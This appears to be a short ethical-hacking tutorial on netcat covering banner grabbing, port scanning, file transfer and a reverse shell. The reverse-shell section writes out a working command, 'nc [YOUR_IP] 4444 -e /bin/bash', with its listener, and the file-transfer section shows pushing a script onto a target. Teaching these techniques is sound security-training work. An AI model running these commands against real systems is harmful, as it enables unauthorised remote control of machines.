# Netcat: The Swiss Army Knife

**Netcat (nc)** is programmed to read and write data across network connections using TCP or UDP. It is so versatile that it's often called the "Swiss Army Knife" of networking.

As a hacker, you will use it for everything from banner grabbing to establishing full-blown reverse shells.

---

## 1. Banner Grabbing

The first step in service enumeration is seeing what a service says when you connect to it.

<TerminalWindow cmd="nc -nv 10.10.10.5 22" output="(UNKNOWN) [10.10.10.5] 22 (ssh) open
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
[!] Software version identified: OpenSSH 7.6p1" />

## 2. Port Scanning

While Nmap is better for large scans, Netcat is great for a quick check.
- `-z`: Zero-I/O mode (useful for scanning).
- `-w 1`: Timeout after 1 second.

<TerminalWindow cmd="nc -zv 10.10.10.5 20-25" output="10.10.10.5 21 (ftp) : Connection refused
10.10.10.5 22 (ssh) : open
10.10.10.5 23 (telnet) : Connection refused" />

## 3. Reverse Shell (The Real Power)

A **Reverse Shell** is when the target machine initiates a connection back to your machine. This is used to bypass firewalls, as most firewalls block incoming connections but allow outgoing ones.

### Step 1: Start a listener on your machine
<TerminalWindow cmd="nc -lvnp 4444" output="listening on [any] 4444 ..." />

### Step 2: Execute the shell on the target
`nc [YOUR_IP] 4444 -e /bin/bash`

```mermaid

    participant H as Hacker (Listener)
    participant T as Target (Exploited)
    Note over H: nc -lvnp 4444
    T->>H: Outgoing Connection to Port 4444
    H->>T: Sends command 'whoami'
    T->>H: Returns 'root'
```

## 4. Simple File Transfer

Need to get a tool onto a target machine? Netcat can do it.

**On receiver (Target):** `nc -lp 1234 > script.sh`  
**On sender (Hacker):** `nc -w 3 [TARGET_IP] 1234 < script.sh`
